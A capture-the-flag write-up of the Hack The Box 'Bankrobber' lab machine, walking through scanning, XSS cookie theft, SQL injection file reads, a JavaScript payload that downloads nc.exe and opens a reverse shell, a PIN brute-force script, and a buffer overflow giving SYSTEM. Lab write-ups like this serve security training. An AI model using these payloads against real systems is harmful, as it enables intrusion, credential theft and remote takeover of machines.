---
title: Hack The Box - Bankrobber (Without Metasploit)
date: 2021-01-24 04:09:00 +0800
categories: [hackthebox]
tags: [windows, xss, sqli, bof]
image:
    path: /assets/images/bankrobber.png
---

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.154 bankrobber.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ rustscan --accessible -a bankrobber.htb -r 1-65535 -- -sT -sV -sC -Pn
File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.154:80
Open 10.10.10.154:443
Open 10.10.10.154:445
Open 10.10.10.154:3306
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-23 09:18 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
Initiating Connect Scan at 09:19
Scanning bankrobber.htb (10.10.10.154) [4 ports]
Discovered open port 443/tcp on 10.10.10.154
Discovered open port 80/tcp on 10.10.10.154
Discovered open port 445/tcp on 10.10.10.154
Discovered open port 3306/tcp on 10.10.10.154
Completed Connect Scan at 09:19, 0.02s elapsed (4 total ports)
Initiating Service scan at 09:19
Scanning 4 services on bankrobber.htb (10.10.10.154)
Completed Service scan at 09:19, 12.40s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.10.154.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:19
NSE Timing: About 99.81% done; ETC: 09:19 (0:00:00 remaining)
Completed NSE at 09:19, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.13s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.01s elapsed
Nmap scan report for bankrobber.htb (10.10.10.154)
Host is up, received user-set (0.017s latency).
Scanned at 2021-01-23 09:19:00 UTC for 53s

PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     syn-ack Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        syn-ack MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26952/tcp): CLEAN (Timeout)
|   Check 2 (port 7157/tcp): CLEAN (Timeout)
|   Check 3 (port 52758/udp): CLEAN (Timeout)
|   Check 4 (port 49869/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-23T09:19:15
|_  start_date: 2021-01-23T09:18:14

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:19
Completed NSE at 09:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.58 seconds
```

# Enumeration (1)

## Port 80 `httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)`

![](/assets/images/bankrobber1.png)

Scrolling down there was a login and a register form.

![](/assets/images/bankrobber2.png)

After registering an account and logging in with it, we see a form that allows us to transfer "E-Coins" to other people.

![](/assets/images/bankrobber3.png)

After submitting the form with random values, we see a popup:

![](/assets/images/bankrobber4.png)

It seems possible that the admin will be previewing whatever we send. Let's try putting an `<img>` tag which points to `nc` listener instead of a web server so that we can preview the raw `HTTP` request.

```bash
$ sudo nc -lvnp 80
listening on [any] 80 ...
```

And we send the following in our comment:

```html
<img src="http;//10.10.14.30/">
```

After a while, we see the raw `HTTP` request!

```bash
$ sudo rlwrap nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.154] 49788
GET / HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.XX.XX
```

In the user agent, we see `PhantomJS`, which is a headless browser that is probably used to automate user activity of previewing the users' transactions. If you see the referrer, it says that it came from `/admin/index.php`! This means it must have something in its cookies that is enabling it to access the admin pages so lets attempt to steal its cookie.

# Exploitation (1)

We send another transaction with the follow comment:

```html
<img src=x onerror=this.src='http://10.10.XX.XX/?c='+document.cookie>
```

Then on our `nc` listener, we see the raw `HTTP` request, this time with the admin's cookie attached!

```bash
$ sudo rlwrap nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.154] 49788
GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1
Referer: http://localhost/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.XX.XX
```

We see the base64-encoded version of the admin's credentials, so lets decode them and login as the admin.

![](/assets/images/bankrobber5.png)

![](/assets/images/bankrobber6.png)

I first checked out the `Backdoorchecker.php`, however it didn't allow as we were not sending from `localhost`.

![](/assets/images/bankrobber7.png)

However, the `Search users` feature was vulnerable to `SQL` injection, which I utilised in order to retrieve the contents of `backdoorchecker.php`.

By submitting `' and 1=1 UNION select load_file('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),1,1;`, we get the following contents:

```bash
<?php

include('../link.php');
include('auth.php');

$username = base64_decode(urldecode($_COOKIE['username']));
$password = base64_decode(urldecode($_COOKIE['password']));
$bad 	  = array('$(','&');
$good 	  = "ls";

if(strtolower(substr(PHP_OS,0,3)) == "win"){
	$good = "dir";
}

if($username == "admin" && $password == "Hopelessromantic"){
	if(isset($_POST['cmd'])){
			// FILTER ESCAPE CHARS
			foreach($bad as $char){
				if(strpos($_POST['cmd'],$char) !== false){
					die("You're not allowed to do that.");
				}
			}
			// CHECK IF THE FIRST 2 CHARS ARE LS
			if(substr($_POST['cmd'], 0,strlen($good)) != $good){
				die("It's only allowed to use the $good command");
			}
			if($_SERVER['REMOTE_ADDR'] == "::1"){
				system($_POST['cmd']);
			} else{
				echo "It's only allowed to access this function from localhost (::1).<br> This is due to the recent hack attempts on our server.";
			}
	}
} else{
	echo "You are not allowed to use this function!";
}
?>
```

With this, we can now better understand how to utilise the `backdoorchecker.php`. We need a way to force the headless browser to create a `HTTP` `POST` request. To do so, we can get it to load an external javascript file hosted our own web server which will contain the code that will perform the `HTTP` `POST` request.

# Exploitation (2)

Lets create our javascript file and call it `load.js` and host it on our own web server. Also make sure `nc.exe` is also being served. 

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost/admin/backdoorchecker.php", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cmd=dir|powershell -c "Invoke-WebRequest -Uri http://10.10.XX.XX/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd.exe 10.10.XX.XX 1337');
```

Then, back to our regular user homepage, we send another transaction with the following comment:

```html
<script src="http://10.10.XX.XX/load.js"></script>
```

We then setup our `nc` listener, this time to listen for a reverse shell.

```bash
$ sudo nc -lvnp 1337
listening on [any] 1337 ...
```

Subsequently, we will receive a connection as `cortin`.

```bash
$ rlwrap nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.154] 50589
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

whoami
whoami
bankrobber\cortin
```
# user.txt

The user flag is in `cortin`'s Desktop.

```
type user.txt
f635XXXXXXXXXXXXXXXXXXXXXXXXXXXX
C:\Users\Cortin\Desktop>
```

# Enumeration (2)

In the `C:\` directory, there is a file called `bankv2.exe`.

```
dir C:\

 Volume in drive C has no label.
 Volume Serial Number is C80C-B6D3

 Directory of C:\

25-04-2019  16:50            57.937 bankv2.exe
...
```

It is currently being ran and was exposed on the port `910` but for some reason, it was not reachable from outside.

```
tasklist /v
...                                                            
bankv2.exe                    1984                            0        376 K Unknown         N/A 
...
```

```
netstat -ano 
...
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1984
...
```

Therefore, I uploaded a `plink.exe` and performed port forwarding in order for us to interact with it.

```
plink.exe -l kali -pw kali 10.10.XX.XX -R 9090:127.0.0.1:910 -P 2222
```

Now if we interact with it, it immediately prompts us for a 4-digit pin number.

```bash
$ nc -v 127.0.0.1 9090   
localhost [127.0.0.1] 9090 (?) open
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 1234
 [!] Access denied, disconnecting client....
```

I then wrote a `python` script to help brute force the pin.

```python
import socket

IP_PORT = ("127.0.0.1",9090)
BUFFER_SIZE = 2048


def testcode(code: str) -> bool:
    print(f"Testing {code}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(IP_PORT)
        s.recv(BUFFER_SIZE)
        s.send(f"{code}\n".encode())
        output = s.recv(BUFFER_SIZE).decode()
        s.close()
        return "Access denied" not in output


def main():
    for d1 in range(10):
        for d2 in range(10):
            for d3 in range(10):
                for d4 in range(10):
                    if testcode(f"{d1}{d2}{d3}{d4}"):
                        print(f"Found pin: {d1}{d2}{d3}{d4}")
                        return

if __name__ == "__main__":
    main()
```

```bash
$ python3 brute.py
Testing 0000
Testing 0001
Testing 0002
Testing 0003
Testing 0004
Testing 0005
Testing 0006
Testing 0007
Testing 0008
Testing 0009
Testing 0010
Testing 0011
Testing 0012
Testing 0013
Testing 0014
Testing 0015
Testing 0016
Testing 0017
Testing 0018
Testing 0019
Testing 0020
Testing 0021
Found pin: 0021
```

Turns out `0021` was the correct pin.

```
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 1234
 [$] Transfering $1234 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
```

Now it prompts us how much e-coins we want to transfer and we see that `transfer.exe` is then executed. But what happens if we put a very long string as our input?

```
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAA

 [$] Transaction in progress, you can safely disconnect
```

We overwrote the memory space that contained `C:\Users\admin\Documents\transfer.exe` and it executed a bunch of `A`s instead!

# Exploitation (3)

We can use `msf-pattern_create` to determine the offset.

```bash
$ msf-pattern_create -l 100                                                                 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Lets pump it into the program again and calculate our offset.

```bash
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

$ msf-pattern_offset -q 0Ab1
[*] Exact match at offset 32
```

Now that we know the offset, we can just submit 32 `A`s and append our reverse shell command at the back!

```bash
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337

 [$] Transaction in progress, you can safely disconnect...
```

On our listener that we setup beforehand, we get a shell as `SYSTEM`!

```bash
$ sudo rlwrap nc -lvnp 1337
[sudo] password for kali: 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.154] 55667
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.

whoami
whoami
nt authority\system
```

# root.txt

The root flag is in `Administrator`'s Desktop.

```
C:\Windows\system32>type C:\Users\admin\Desktop\root.txt
type C:\Users\admin\Desktop\root.txt
aa65XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

### Rooted ! Thank you for reading and look forward for more writeups and articles !